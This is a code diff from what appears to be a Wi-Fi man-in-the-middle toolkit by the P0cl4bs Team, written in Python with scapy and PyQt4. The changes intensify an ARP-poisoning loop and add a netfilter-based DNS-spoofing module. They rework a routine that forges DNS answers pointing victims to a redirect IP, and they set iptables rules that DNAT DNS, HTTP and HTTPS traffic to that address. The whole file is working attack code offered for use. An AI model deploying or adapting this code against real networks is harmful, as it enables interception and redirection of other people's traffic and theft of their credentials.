@@ -2,7 +2,8 @@ import Queue
 from os import system
 from scapy.all import *
 from threading import Thread
-from PyQt4.QtCore import QThread,SIGNAL
+from time import sleep
+from PyQt4.QtCore import QThread,SIGNAL,QObject,QProcess,pyqtSlot,SLOT,pyqtSignal
 from datetime import datetime
 
 """
@@ -11,7 +12,7 @@ Description:
     for modules.
 
 Copyright:
-    Copyright (C) 2015 Marcos Nesster P0cl4bs Team
+    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
@@ -73,16 +74,48 @@ class ThARP_posion(QThread):
         print 'Starting Thread:' + self.objectName()
         pkt = self.makePacket()
         while self.process:
-            sendp(pkt,verbose=False)
-            sleep(2)
-
+            send(pkt,verbose=False, count=3),sendp(pkt,verbose=False, count=3)
     def stop(self):
         self.process = False
         print 'Stop thread:' + self.objectName()
         self.emit(SIGNAL('Activated( QString )'),'Ok')
 
 
+class ThreadDNSspoofNF(QObject):
+    DnsReq = pyqtSignal(object)
+    def __init__(self,domains,interface,redirect,APmode=True,parent=None):
+        super(ThreadDNSspoofNF, self).__init__(parent)
+        self.domains    = domains
+        self.interface  = interface
+        self.redirect   = redirect
+        self.APmode     = APmode
+        self.desc       = 'DNS spoof Module::NetFilter'
 
+    @pyqtSlot()
+    def readProcessOutput(self):
+        self.data = str(self.procThreadDNS.readAllStandardOutput())
+        self.DnsReq.emit(self.data)
+
+    def start(self):
+        self.setIptables(self.APmode,option='A')
+        self.procThreadDNS = QProcess(self)
+        self.procThreadDNS.setProcessChannelMode(QProcess.MergedChannels)
+        QObject.connect(self.procThreadDNS, SIGNAL('readyReadStandardOutput()'), self, SLOT('readProcessOutput()'))
+        self.procThreadDNS.start('python',['Core/packets/dnsspoofNF.py','-r',self.redirect,
+        '-d',','.join(self.domains)])
+
+    def setIptables(self,APMode=True, option=str()):
+        if APMode:
+            system('iptables -{} INPUT -i {} -p udp --dport 53 -s {} -j ACCEPT'.format(option,self.interface,self.redirect))
+            system('iptables -{} INPUT -i {} -p udp --dport 53 -j DROP'.format(option,self.interface))
+            system('iptables -t nat -{} PREROUTING -p udp --dport 53 -j NFQUEUE'.format(option))
+
+    def stop(self):
+        self.setIptables(self.APmode,option='D')
+        if hasattr(self,'procThreadDNS'):
+            self.procThreadDNS.terminate()
+            self.procThreadDNS.waitForFinished()
+            self.procThreadDNS.kill()
 
 class ThSpoofAttack(QThread):
     def __init__(self,domains,interface,filter,verbose,redirect):
@@ -118,10 +151,10 @@ class ThSpoofAttack(QThread):
 
     def StartSpoof(self,q):
         while self.finished:
-            sniff(iface = self.interface,
-            count = 10, filter = self.filter, prn = lambda x : q.put(x))
+            sniff(iface = self.interface,count = 10, filter = self.filter, prn = lambda x : q.put(x))
 
     def sniff(self):
+        self.setIptables(option='A')
         q = Queue.Queue()
         sniffer = Thread(target =self.StartSpoof, args = (q,))
         sniffer.daemon = True
@@ -135,23 +168,19 @@ class ThSpoofAttack(QThread):
 
     def Poisoning(self,packet):
         #https://github.com/Adastra-thw/pyHacks/blob/master/MitmDnsSpoofingPoC.py
-        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target) > 0:
-            for targetDomain, ipAddressTarget in self.target.items():
-                if packet.getlayer(DNS).qd.qname == targetDomain:
-                    try:
-                        requestIP = packet[IP]
-                        requestUDP = packet[UDP]
-                        requestDNS = packet[DNS]
-                        requestDNSQR = packet[DNSQR]
-                        responseIP = IP(src=requestIP.dst, dst=requestIP.src)
-                        responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
-                        responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = ipAddressTarget)
-                        responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
-                        answer = responseIP/responseUDP/responseDNS
-                        send(answer)
-                    except:
-                        pass
-        elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target) == 0:
+        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target.keys()) > 0:
+            if  packet[DNS].qd.qname[:len(str(packet[DNS].qd.qname))-1] in self.target.keys():
+                requestIP = packet[IP]
+                requestUDP = packet[UDP]
+                requestDNS = packet[DNS]
+                requestDNSQR = packet[DNSQR]
+                responseIP = IP(src=requestIP.dst, dst=requestIP.src)
+                responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
+                responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = self.redirect)
+                responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
+                answer = responseIP/responseUDP/responseDNS
+                send(answer)
+        elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target.keys()) == 0:
             try:
                 requestIP = packet[IP]
                 requestUDP = packet[UDP]
@@ -165,32 +194,18 @@ class ThSpoofAttack(QThread):
                 send(answer)
             except Exception:
                 pass
-    def redirection(self):
-        system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
-        system('iptables --append FORWARD --in-interface '+self.interface+' --jump ACCEPT')
-        system('iptables --table nat --append POSTROUTING --out-interface '+self.interface+' --jump MASQUERADE')
-        system('iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.redirect)
-        system('iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination '+self.redirect)
-        system('iptables -t nat -A PREROUTING -i '+self.interface+' -p udp --dport 53 -j DNAT --to '+self.redirect)
-        system('iptables -t nat -A PREROUTING -i '+self.interface+' -p tcp --dport 53 -j DNAT --to '+self.redirect)
 
-    def redirectionAP(self):
-        system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
-        system('iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.redirect)
-        system('iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination '+self.redirect)
-        system('iptables -t nat -A PREROUTING -i '+self.interface+' -p udp --dport 53 -j DNAT --to '+self.redirect)
-        system('iptables -t nat -A PREROUTING -i '+self.interface+' -p tcp --dport 53 -j DNAT --to '+self.redirect)
+    def setIptables(self,option=str()):
+        system('iptables -t nat -{} PREROUTING -p udp --dport 53 -j NFQUEUE'.format(option))
+        system('iptables -{} FORWARD --in-interface {} --jump ACCEPT'.format(option,self.interface))
+        system('iptables -t nat -{} POSTROUTING --out-interface {} --jump MASQUERADE'.format(option,self.interface))
+        system('iptables -t nat -{} PREROUTING -p tcp --dport 80 --jump DNAT --to-destination {}'.format(option,self.redirect))
+        system('iptables -t nat -{} PREROUTING -p tcp --dport 443 --jump DNAT --to-destination {}'.format(option,self.redirect))
+        system('iptables -t nat -{} PREROUTING -i {} -p udp --dport 53 -j DNAT --to {}'.format(option,self.interface,self.redirect))
+        system('iptables -t nat -{} PREROUTING -i {} -p tcp --dport 53 -j DNAT --to {}'.format(option,self.interface,self.redirect))
 
-    def redirectionRemove(self):
-        system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE')
-        system('iptables -D FORWARD --in-interface '+self.interface+' --jump ACCEPT')
-        system('iptables --table nat -D POSTROUTING --out-interface '+self.interface+' --jump MASQUERADE')
-        system('iptables -t nat -D PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.redirect)
-        system('iptables -t nat -D PREROUTING -p tcp --dport 443 --jump DNAT --to-destination '+self.redirect)
-        system('iptables -t nat -D PREROUTING -i '+self.interface+' -p udp --dport 53 -j DNAT --to '+self.redirect)
-        system('iptables -t nat -D PREROUTING -i '+self.interface+' -p tcp --dport 53 -j DNAT --to '+self.redirect)
     def stop(self):
         print 'Stop Thread:' + self.objectName()
         self.finished = True
-        self.redirectionRemove()
+        self.setIptables(option='D')
         self.emit(SIGNAL('Activated( QString )'),'finished')
